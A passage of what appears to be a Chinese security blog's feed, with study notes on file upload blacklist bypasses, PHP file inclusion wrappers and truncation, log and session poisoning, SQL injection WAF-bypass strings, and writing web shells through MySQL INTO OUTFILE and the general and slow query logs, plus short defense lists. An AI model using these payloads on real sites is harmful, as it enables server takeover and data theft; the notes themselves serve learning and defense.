plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">1.先制作图片马</span><br><span class="line">2.正常上传图片马</span><br><span class="line">3.查看图片马的文件名</span><br><span class="line">4.执行图片马：include.php/file=./upload/xxx.jpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传——黑名单绕过</title>
      <link href="/2022/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0_%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"/>
      <url>/2022/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0_%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>文件名大小写绕过、黑名单列表绕过、特殊文件名绕过</p><p>%00截断、.htaccess攻击、Apache解析漏洞、IIS解析漏洞</p><p>Nginx解析漏洞、多文件上传(条件竞争)、管理员配置错误</p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原理：后端校验未使用strtolow/strtoup等函数对后缀进行大小写统一</span><br><span class="line"></span><br><span class="line">test.Php</span><br></pre></td></tr></table></figure><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原理：只进行了一次过滤</span><br><span class="line"></span><br><span class="line">test.phphpp</span><br></pre></td></tr></table></figure><h3 id="特殊文件名绕过"><a href="#特殊文件名绕过" class="headerlink" title="特殊文件名绕过"></a>特殊文件名绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP1,PHP2,PHP3,PHP4,PHP5,PHP6</span><br></pre></td></tr></table></figure><h3 id="windows特性"><a href="#windows特性" class="headerlink" title="windows特性"></a>windows特性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">末尾的点&#x27;.&#x27;绕过</span><br><span class="line">末尾空格&#x27; &#x27;绕过</span><br><span class="line">::$DATA 占位//慎用！若出现xxx.php.::$DATA的方式，则有可能删除不了文件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2022/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​大部分的网站和应用系统都有上传功能，而程序员在开发文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。</p><p>​而<strong>文件上传漏洞</strong>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。一般都是指“上传Web脚本能够被服务器解析”的问题。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>​可能会导致用户信息泄露，被钓鱼，甚至使攻击者可以直接上传WebShell到服务器，进而得到自己想要的信息和权限。最终达到对数据库执行、服务器文件管理、服务器命令执行等恶意操作，甚至完全控制服务器系统。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>文件上传漏洞利用条件：</p><p>（1）能够成功上传木马。</p><p>（2）上传的木马能够被web容器解析执行，所以上传路径要在web容器覆盖范围内。</p><p>（3）用户能够访问上传的木马，所以得知道上传的木马准确路径。</p><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>看我这篇文章<a href="https://www.jqsafe.top/2022/10/07/文件上传_黑名单绕过">文件上传——黑名单绕过</a></p><h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><p>看我这篇文章<a href="https://www.jqsafe.top/2022/10/07/文件上传_白名单绕过">文件上传——白名单绕过</a></p><h2 id="扩展手段"><a href="#扩展手段" class="headerlink" title="扩展手段"></a>扩展手段</h2><p>看我这篇文章<a href="https://www.jqsafe.top/2022/10/07/文件上传_扩展手段">文件上传——扩展手段</a></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1、文件上传的目录权限设置为不可执行</p><p>2、判断文件类型：最好是白名单方式。</p><p>3、图片处理：可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的html代码</p><p>4、使用随机数改写文件名和文件路径：一个是上传后无法访问，二是因为重命名后无法攻击</p><p>5、单独设置文件服务器的域名：由于浏览器同源策略的关系，一系列客户端都将失效</p><p>6、限制上传文件大小</p>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2022/10/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2022/10/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在通过引入文件时，包含的文件名被用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过</p><h4 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h4><p>include()、include_once()、 require()、require_once</p><h5 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h5><p>include：包含的文件不存在，返回警告，继续执行</p><p>require：包含的文件不存在，返回警告，停止执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On    //默认为On</span><br><span class="line">allow_url_include = On  //php5.2后默认为Off</span><br></pre></td></tr></table></figure><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1.配合文件上传漏洞GetShell</p><p>2.可以执行任意脚本代码(php:&#x2F;&#x2F;input)</p><p>3.网站源码文件以及配置文件泄露(php:&#x2F;&#x2F;filter)</p><p>4.远程包含Get Shell</p><p>5.控制整个网站甚至是服务器</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">原因：当被包含的文件在服务器本地时，就形成了本地文件包含漏洞</span><br><span class="line"></span><br><span class="line">利用：</span><br><span class="line">1.上传图片马，包含图片马getshell</span><br><span class="line">2.读取网页源码以及配置文件</span><br><span class="line">3.包含入职文件getshell</span><br><span class="line">4.包含session文件拿到shell</span><br><span class="line"></span><br><span class="line">方法：使用../跳回上一级目录</span><br><span class="line">例如：</span><br><span class="line">www.xx.com/?id=../../test/test.php</span><br></pre></td></tr></table></figure><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">原因：php.ini中的配置选项：allow_url_fopen和allow_url_include为NO的话，则包含的文件可以是第三方服务器中的文件。</span><br><span class="line"></span><br><span class="line">www.localhost.com/test.php?page=www.sqli.com/test.txt</span><br><span class="line"></span><br><span class="line">若出现添加后缀，可用：? 截断、 %23 截断</span><br><span class="line"></span><br><span class="line">www.localhost.com/test.php?page=www.sqli.com/test.txt?</span><br><span class="line"></span><br><span class="line">www.localhost.com/test.php?page=www.sqli.com/test.txt%23</span><br></pre></td></tr></table></figure><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>(只能读取，不能执行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.file_get_contents($_GET[&#x27;page&#x27;])</span><br><span class="line"></span><br><span class="line">2.$a = fopen($_GET[&#x27;page&#x27;])</span><br><span class="line">  echo fread($a,200)</span><br><span class="line"></span><br><span class="line">//远程包含，需要开启allow_url_fopen,allow_url_include</span><br><span class="line"></span><br><span class="line">http://www.localhost.com/test/shell.php?page=../sqli-labs-master/sql-connections/db-creds.inc</span><br><span class="line">右键查看源代码</span><br></pre></td></tr></table></figure><h3 id="文件包含相关协议"><a href="#文件包含相关协议" class="headerlink" title="文件包含相关协议"></a>文件包含相关协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、php://</span><br><span class="line"></span><br><span class="line">1.1、filter:只是读取，不受allow_url_fopen和allow_url_include影响</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">php://filter/read=convert.base64-encode/resource=../1.txt</span><br><span class="line"></span><br><span class="line">将1.txt文件中的数据进行base64加密后再输出</span><br><span class="line"></span><br><span class="line">1.2、input:不受allow_url_fopen影响，需要开启 allow_url_include，需要GET方式提交、在bp转换成POST方式提交，理论上可以执行任何PHP代码</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">php://input，抓包后在下面添加php语句</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2、data:需要开启allow_url_fopen和allow_url_include</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">data:text/plain,&lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line">data:text/plain;base64,编码后的php代码//不能有+号、空格</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">3、zip://不受allow_url_fopen和allow_url_include影响</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">zip://[压缩文件路径+压缩文件名]%23[压缩文件内的子文件名]</span><br><span class="line"></span><br><span class="line">zip://./1.zip%231.txt</span><br><span class="line"></span><br><span class="line">zip://C:/phpstudy/WWW/haha/1.zip%231.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4、file://不受allow_url_fopen和allow_url_include影响</span><br><span class="line"></span><br><span class="line">作用：访问本地文件系统</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">file://文件绝对路径和文件名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">5、ftp://http://需要开启 allow_url_fopen,allow_url_include(远程包含)</span><br><span class="line"></span><br><span class="line">http://172.18.11.66/0831/1.txt</span><br><span class="line"></span><br><span class="line">ftp://172.18.11.66/0831/1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6、php://include</span><br><span class="line">抓包后在最底下加上文件生成代码：</span><br><span class="line">&lt;?php file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php phpinfo();?&gt;&#x27;) ?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://xxx.png/shell.php</span><br></pre></td></tr></table></figure><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>目的：截断后面自带的各种后缀</p><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>前提条件：php版本小于5.3.4，没有开启全局GPC：magic_quotes_gpc&#x3D;off</p><p>&#x2F;etc&#x2F;passwd&#x2F;1.txt%00</p><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><p>前提条件：php版本小于5.2.8</p><p>linux需要文件名长于4096，windows需要长于256</p><p>etc&#x2F;passowrd&#x2F;1.txt.&#x2F;.&#x2F;.&#x2F;.&#x2F;·[···]·.&#x2F;.</p><h3 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h3><p>步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.首先，找到日志文件存放位置(httpd.ini设置，默认开启)</span><br><span class="line">2.让日志文件插入PHP代码</span><br><span class="line">3.包含日志文件</span><br><span class="line">例子：</span><br><span class="line">bp抓包，更改请求头为/test/1.php? &lt;?php phpinfo();?&gt;</span><br><span class="line">浏览器输入：xxx.com/test/1.php?page=日志文件路径</span><br></pre></td></tr></table></figure><h3 id="SESSION文件包含"><a href="#SESSION文件包含" class="headerlink" title="SESSION文件包含"></a>SESSION文件包含</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.找到session的存放路径，如phpstudy\tmp\tmp</span><br><span class="line">2.bp抓包，更改请求头为/test/1.php?user=&lt;?php+phpinfo();?&gt;</span><br><span class="line">3.浏览器访问：xxx.com/test/1.php?user=session存放路径+文件名</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>1、没有通用的挖掘办法(Google搜索include…file&#x3D;…)</p><p>2、没有特定的CMS(内容管理系统)，特定的版本可能存在漏洞(include, require)</p><p>3、Web漏洞扫描器扫描，常见的web漏洞扫描器都支持可以检测</p><p>4、手工挖掘，看参数，filename&#x3D;xxx，是否可以包含其他文件</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、PHP中使用open_basedir配置限制访问在只当的区域</span><br><span class="line"></span><br><span class="line">2、过滤 点(.)、斜杠(/)、反斜杠(\)</span><br><span class="line"></span><br><span class="line">3、禁止服务器远程文件包含allow_url_fopen=off、allow_url_include=off</span><br><span class="line"></span><br><span class="line">4、包含的参数值，不让用户可控</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入——杂项篇</title>
      <link href="/2022/10/01/SQL%E6%B3%A8%E5%85%A5_%E6%9D%82%E9%A1%B9%E7%AF%87/"/>
      <url>/2022/10/01/SQL%E6%B3%A8%E5%85%A5_%E6%9D%82%E9%A1%B9%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="注释风格"><a href="#注释风格" class="headerlink" title="注释风格"></a>注释风格</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#//最常见的注释符号</span><br><span class="line"></span><br><span class="line">--+//在url里，+号通常会解析成空格，在某些数据库(mysql)里，--空格 具有注释功能</span><br><span class="line"></span><br><span class="line">/*!00000*///内联注释</span><br></pre></td></tr></table></figure><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">and = anandd双写绕过</span><br><span class="line"></span><br><span class="line">and =&amp;&amp;对等符号绕过</span><br><span class="line"></span><br><span class="line">and = %26%26编码/转义绕过</span><br><span class="line"></span><br><span class="line">UNioN SelECt大小写绕过//window适用</span><br></pre></td></tr></table></figure><h2 id="判断字符型和数字型"><a href="#判断字符型和数字型" class="headerlink" title="判断字符型和数字型"></a>判断字符型和数字型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1=2页面正常为字符型</span><br><span class="line"></span><br><span class="line">&#x27; &quot;单双引号闭合</span><br><span class="line"></span><br><span class="line">\反斜杠转义</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="事务回滚"><a href="#事务回滚" class="headerlink" title="事务回滚"></a>事务回滚</h3><p>仅innoDB索引支持事务，针对的是数据表内的数据，对于数据表的字段不适用</p><h3 id="风险区"><a href="#风险区" class="headerlink" title="风险区"></a>风险区</h3><p>遇到delete、update语句谨慎操作，风险很大</p><h3 id="MySQL5-0以上和5-0以下的区别"><a href="#MySQL5-0以上和5-0以下的区别" class="headerlink" title="MySQL5.0以上和5.0以下的区别"></a>MySQL5.0以上和5.0以下的区别</h3><p>mysql5.0及以上的版本都存在一个系统自带的系统数据库：information_schema，而5.0以下并不存在</p><h3 id="无法利用information-schema"><a href="#无法利用information-schema" class="headerlink" title="无法利用information_schema"></a>无法利用information_schema</h3><p>mysql5.0以下没有information_schema这个数据库</p><p>可以使用mysql.innodb_table_stats代替</p><p>information_schema可以查到所有的数据库和表名和列名；</p><p>但是mysql.innodb_table_stats只查到表名，所以不知道列名；</p><p>1.InnoDb引擎<br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。<br>2.sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。</p><h3 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_real_escape_string</span>()<span class="comment">//包装用户输入的字符串，过滤预定义的字符</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">get_magic_quotes_gpc</span>()<span class="comment">//全局GPC，过滤单双引号</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addslashes</span>()<span class="comment">//返回在预定义的字符前添加反斜杠的字符串，过滤单双引号</span></span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">intval</span>()<span class="comment">//强制转为整数，若不能转为整数，则后面的数据全部丢弃，主要针对整型注入</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h3><p>1.限制数据类型（可以使用16进制绕过）</p><p>2.正则表达式匹配传入参数</p><p>3.使用函数过滤</p><p>4.PDO预编译处理</p><h3 id="XDEBUG"><a href="#XDEBUG" class="headerlink" title="XDEBUG"></a>XDEBUG</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在ip后加上 &amp;XDEBUG_SESSION_START=PHPSTORM</span><br><span class="line">例如：www.localhost.com/ip.php/XDEBUG_SESSION_START=PHPSTORM//仅针对配置过的phpstorm使用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入——WAF篇</title>
      <link href="/2022/10/01/SQL%E6%B3%A8%E5%85%A5_waf%E7%AF%87/"/>
      <url>/2022/10/01/SQL%E6%B3%A8%E5%85%A5_waf%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h3 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h3><p>软件型：安全狗、云锁、D盾…（能装到服务器的）</p><p>云waf(ids)：玄武盾、腾讯云、华为云、亚马逊云…(部署在云端的)</p><p>硬件型(加强版的防火墙)：在链路中,支持多种部署方式,当串联到链路中时可以拦截恶意流量,在旁路监听模式时只记录攻击不进行拦截</p><p>代码型：网站的所有入栈流量先经过waf过滤再传入到想要执行的参数处</p><h3 id="类型绕过"><a href="#类型绕过" class="headerlink" title="类型绕过"></a>类型绕过</h3><p>软件型waf绕过：下载到本地进行测试</p><p>云waf绕过：找到服务器的真正ip地址，然后绑定到电脑的hosts文件，这种waf就不攻自破了</p><p>硬件型waf绕过：真实的网站fuzz(模糊测试)</p><p>代码型waf绕过：除非扫目录，爆代码 文件包含读取文件</p><p>其他</p><p>1.非暴力型：微步在线全球ping历史解析记录</p><p>2.暴力型：DDOS攻击</p><h3 id="绕WAF"><a href="#绕WAF" class="headerlink" title="绕WAF"></a>绕WAF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">|| true=true</span><br><span class="line"></span><br><span class="line">and /*!000001*/=/*!000001*/</span><br><span class="line"></span><br><span class="line">/*bp跑的垃圾数据*///代替空格</span><br><span class="line"></span><br><span class="line">/*!union--+/*%0aselect 1,2,3*///内联+注释+换行，在mysql里会拼接起来</span><br><span class="line"></span><br><span class="line">like &quot;[%23]&quot; union /*//--/*/select 1,2,3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入——shell篇</title>
      <link href="/2022/10/01/SQL%E6%B3%A8%E5%85%A5_shell%E7%AF%87/"/>
      <url>/2022/10/01/SQL%E6%B3%A8%E5%85%A5_shell%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入写shell"><a href="#SQL注入写shell" class="headerlink" title="SQL注入写shell"></a>SQL注入写shell</h2><h3 id="数据库的文件管理"><a href="#数据库的文件管理" class="headerlink" title="数据库的文件管理"></a>数据库的文件管理</h3><h4 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h4><p>1、拥有文件读写权限；</p><p>2、在mysql.ini的配置文件里，secure_file_priv为空</p><p>3、未开启全局GPC(get_magic_quotes_gpc())；</p><p>4、知道文件路径</p><h4 id="读取文件："><a href="#读取文件：" class="headerlink" title="读取文件："></a>读取文件：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;相对路径或绝对路径&#x27;)</span><br></pre></td></tr></table></figure><h4 id="上传文件："><a href="#上传文件：" class="headerlink" title="上传文件："></a>上传文件：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;内容&#x27; into outfile &#x27;绝对路径&#x27;//以明文方式写入</span><br><span class="line"></span><br><span class="line">select &#x27;内容&#x27; dumpfile &#x27;绝对路径&#x27;//以二进制方式写入</span><br></pre></td></tr></table></figure><hr><p>但有些时候，对方有可能会把文件上传的方式给禁用了，这个时候我们就可以从另一个角度去操作</p><h3 id="全局日志写shell"><a href="#全局日志写shell" class="headerlink" title="全局日志写shell"></a>全局日志写shell</h3><p>需要检查是否打开了全局日志功能</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> VARIABLES <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span><span class="operator">/</span><span class="operator">/</span>查看全局日志的开放状态</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span><span class="operator">/</span><span class="operator">/</span>打开全局日志</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;C://Users/JJ/Desktop/phpstudy2016/WWW/shell.php&#x27;</span> <span class="operator">/</span><span class="operator">/</span>设置日志的存放路径</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span><span class="operator">/</span><span class="operator">/</span>然后通过url访问日志存放的 路径<span class="operator">+</span>文件名，即可执行shell</span><br></pre></td></tr></table></figure><h3 id="慢日志写shell"><a href="#慢日志写shell" class="headerlink" title="慢日志写shell"></a>慢日志写shell</h3><p>需要检查是否打开了慢日志功能</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%long_query_time%&#x27;</span>;<span class="operator">/</span><span class="operator">/</span>查看慢日志的开放状态</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log <span class="operator">=</span> <span class="keyword">on</span><span class="operator">/</span><span class="operator">/</span>打开慢日志功能</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file <span class="operator">=</span> <span class="string">&#x27;C://Users/JJ/Desktop/phpstudy2016/WWW/slow_log.php&#x27;</span><span class="operator">/</span><span class="operator">/</span>设置日志的存放路径</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> <span class="keyword">or</span> sleep(<span class="number">12</span>)<span class="operator">/</span><span class="operator">/</span>然后通过url访问日志存放的 路径<span class="operator">+</span>文件名，即可执行shell</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2022/10/01/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/10/01/SQL%E6%B3%A8%E5%85%A5/</url>
      
